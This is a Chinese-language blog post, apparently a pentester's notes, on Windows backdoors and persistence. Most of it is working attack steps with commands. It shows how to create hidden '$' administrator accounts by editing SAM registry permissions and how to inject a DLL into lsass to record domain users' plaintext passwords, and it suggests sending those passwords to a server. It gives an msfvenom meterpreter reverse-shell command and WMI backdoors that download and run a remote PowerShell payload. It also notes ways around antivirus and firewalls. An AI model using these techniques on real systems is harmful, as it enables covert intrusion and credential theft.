---
layout: post
title: Backdoor and persistence-Windows
date: 2020-01-31 23:30:00
tags: 域渗透 backdoor persistence
categories: hack  
author: PythonPig
---
* content
{:toc}

这篇文章主要记录自己使用的一些Windows后门和权限维持的方法，大部分来自网络，同时会记录一些自己在使用过程中踩的坑，方法会持续更新。  

{:refdef: style="text-align: center;"}
![backdoor](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Backdoor%20and%20persistence-Windows/backdoor.png?raw=true)
{: refdef}   




图片来源于https://xz.aliyun.com/t/4842
### \#0x00 影子账户
影子账户指的是用户名以$结尾，具有administrator权限，使用net user和控制面板看不到的账户。  
下面添加影子账户的方法不适用于DC(域控)，因为该方法利用了本地帐号保存在注册表HKEY_LOCAL_MACHINE\SAM\SAM中的信息，但是域控不存在本地账户： 
```
There is no local account on dc(domain controller)
Please understand that when a Windows server is promoted to a domain controller, the server no longer uses the local account (Security Accounts Manager [SAM]) database during normal operations to store users and groups. When the promotion is complete, the new domain controller has a copy of the Active Directory database in which it stores users, groups, and computer accounts. The SAM database is present, but it is inaccessible when the server is running in Normal mode. The only time that the local SAM database is used is when you boot into Directory Services Restore mode or the Recovery Console. 
If this new domain controller is the first domain controller in a new domain, the local SAM database that the new domain controller contained as a stand-alone server is migrated to the Active Directory database that is created during the promotion. All of the local user accounts that the local SAM database contained when it had been a stand-alone server are migrated from the local SAM database to the Active Directory database. In addition, any permissions that had been assigned to the local users, such as, NTFS permissions, are retained when the users are migrated to the Active Directory database.
 
```  
若域控需要添加隐藏用户，可直接添加以$结尾的用户，net user不显示该用户，但在“AD用户和计算机”和“控制面板用户管理”可以看到该用户。  
```
net user test$ !QAZ2wsx#EDC /add            添加的是普通域用户，“AD用户和计算机”可见，“控制面板用户管理”(管理本地用户)不可见
net localgroup administrators test$ /add    加入本地管理员组，“AD用户和计算机”和“控制面板用户管理”可见
```

1、分配注册表权限  
 
因为默认情况下，只用nt authority\system可以编辑HKEY_LOCAL_MACHINE\SAM\SAM，因此需要给administrator分配权限，regini的使用可以查看使用帮助。  
```
regini up.ini
```    
up.ini的内容如下:  
```
HKEY_LOCAL_MACHINE\SAM [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4 [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\Administrator [1 17]
```

2、使用powershell脚本添加影子账户  
这里使用三好学生的脚本添加影子账户，[脚本：Windows-User-Clone](https://github.com/3gstudent/Windows-User-Clone)，这个脚本需要system权限，因为注册表的权限已经分配，修改下脚本使脚本可以在administrator权限下运行，[修改后的脚本](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Backdoor%20and%20persistence-Windows/Windows-User-Clone.ps1)，添加的用户名和密码在文件的最后一行。  
```
powershell.exe -file Windows-User-Clone.ps1
```
注：使用wmiexec.py和psexec.py远程操作时，会触发杀软，建议远程桌面登录后执行powershell脚本。  

3、添加成功后，恢复注册表权限  
```
regini down.ini  
```
down.ini的内容如下:  
```
HKEY_LOCAL_MACHINE\SAM [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM [17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains [17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4 [17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\Administrator [17]
```

4、添加帐号的使用  
RDP:直接使用，用户名就是就是添加的用户，如：username$  
wmi:wmiexec.py "username$"@10.100.100.100  
psexe:psexec.py "username$"@10.100.100.100  
使用wmi或psexe时若提示“第一次登录需要修改密码”，则使用RDP在登录时修改密码。  

5、防御  
针对隐藏帐户的利用，查看注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\即可。  
当然，默认管理员权限(administrator)无法查看，需要分配权限或是提升至Sytem权限，可打开注册表编辑器(regedit.exe)直接分配权限。  

### \#0x01 Hook PasswordChangeNotify
在域用户(包括域管)修改密码时，通过Hook PasswordChangeNotify拦截并记录其明文密码。  
利用powershell向lsass进程注入dll，实现Hook功能，详细原理参考《参考》中的相关文章。  
1、生成dll  
源代码可以在这里下载：https://github.com/clymb3r/Misc-Windows-Hacking  
为了使记录的明文密码的文件更隐蔽，简单修改下源代码，使记录密码的文件保存在C:\windows\temp\XXX.tmp文件中。  
使用VS2015开发环境，MFC设置为在静态库中使用MFC，编译工程，生成[HookPasswordChange.dll]()。  

2、下载Powershell的dll注入脚本  
源代码可以在这里下载：https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps  
需要在最后添加一句代码以调用上述dll文件，直接下载 三好学生 修改好的[3gstudent/HookPasswordChangeNotify.ps1](https://github.com/3gstudent/Hook-PasswordChangeNotify)。  

3、Hook PasswordChangeNotify  
将HookPasswordChangeNotify.ps1和HookPasswordChange.dll上传至域控的同一目录下。  
执行：
```
PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
```
当域用户修改密码后，明文密码将被记录在域控的C:\windows\temp\XXX.tmp中。  

4、远程获取明文密码  
可以修改DLL，使获取的明文密码直接上传至服务器，已经有人写好了DLL[kevien/PasswordchangeNotify](https://github.com/kevien/PasswordchangeNotify)。  

5、实际使用  
在使用过程中可能会被杀软拦截，在测试过程中发现，Windows Defender会识别将HookPasswordChangeNotify.ps1识别为恶意脚本而直接隔离，其他杀软未测试。  

### \#0x02 WMI Persistence
介绍几个使用powershell脚本实现WMI Persistence(WMI持久化)的方法，后续补充其他语言的实现方法。  
WMI的相关内容这里不介绍了，参见[WMI相关知识学习](https://pythonpig.github.io/2015/12/20/WMI相关知识学习/)，实现WMI Persistence的过程就是注册一个永久性的WMI事件订阅，当注册的事件被触发时，完成相应的操作。注册永久性的WMI事件需要完成以下三个步骤：  
```
1、Create event filter:创建一个事件过滤器
2、Create event consumer:创建一个事件处理器，代表一个事件触发时执行的动作
3、Bind filter and consumer:将event filter和event consumer绑定，代表将一个过滤器绑定到一个事件处理器
```
这里提供几个大牛已经写好了的powershell脚本实现WMI Persistence。  
这里先介绍一下使用msfvenom生成powershell meterpreter反弹payload的方法。
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.100.222 LPORT=443 -f psh-reflection -a x64 --platform windows -o psh.ps1
```
1、执行cmd命令或者启动本地payload.exe，支持启动触发、用户登录触发、周期触发和定时触发。[WMI-Persistence-local-exe](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Backdoor%20and%20persistence-Windows/WMI-Persistence-local-exe.ps1)，具体使用参见脚本源码的example。  
添加后门  
```
Import-Module .\WMI-Persistence.ps1
Install-Persistence -Trigger Startup -Payload "c:\windows\notepad.exe"
或
Install-Persistence -Trigger Startup -Payload "net user test /add"
或
Install-Persistence -Trigger Startup -Payload "C:\Windows\Help\OEM\payload.bat"
```
删除后门  
```
Import-Module .\WMI-Persistence.ps1
Remove-Persistence
```

2、下载远端powershell payload并执行，支持启动触发。[WMI-Persistence-remote-powershell-startup](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Backdoor%20and%20persistence-Windows/WMI-Persistence-remote-powershell-startup.ps1)。  
添加后门  
```
Import-Module .\WMI-Persistence.ps1
Install-Persistence #目标启动后触发一次
```
删除后门  
```
Import-Module .\WMI-Persistence.ps1
Remove-Persistence
```

3、下载远端powershell payload并执行，支持用户登录触发、周期触发和定时触发。[WMI-Backdoor-remote-powershell](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Backdoor%20and%20persistence-Windows/WMIBackdoor.ps1)，具体使用参见脚本源码的example。  
添加后门  
```
Import-Module .\WMIBackdoor.ps1
Set-WMIBackdoor -URL "http://192.168.1.1/Ps1Payload.ps1" -Name "PWN" -Interval 400 -UserTrigger #登录触发
```
删除后门  
```
Import-Module .\WMIBackdoor.ps1
Remove-WMIBackdoor PWN
```

### \#0x03 SSH反连后门
目标机器上启动SSH Server，使用SSH Client或frp将SSH Server的端口反向代理到VPS。  
该方法需借助计划任务或者WMI Persistence保证系统重启后仍有效。  
具体方法不再这里讨论了。  

### \#0x04 WinRM后门
对于部署了WEB服务的目标来说可以通过把WinRM的端口复用到80或443端口，将流量WS-MAN协议流量隐藏在正常的WEB流量中，可有效绕过防火墙。  
参考[内网渗透之WinRM](https://pythonpig.github.io/2020/09/09/内网渗透之WinRM/)  

### 参考
* [渗透技巧——Windows系统的帐户隐藏](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/)  
* [windows后渗透维权](http://www.landq.cn/2019/09/01/windows%E5%90%8E%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83/)  
* [域渗透——Hook PasswordChangeNotify](https://3gstudent.github.io/3gstudent.github.io/about/)
* [Persistence – WMI Event Subscription](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/)
* [利用WMI构建一个持久化的异步的无文件后门](https://m0nst3r.me/pentest/利用WMI构建一个持久化的异步的无文件后门.html)
* [WMI中的SQL,WQL简明教程系列](http://blog.useasp.net/archive/2013/06/15/the-tutorial-series-of-wql-that-the-sql-in-wmi-chapter-one-keywords.aspx)
* [Microsoft Docs - Windows Management Instrumentation](https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmi-start-page)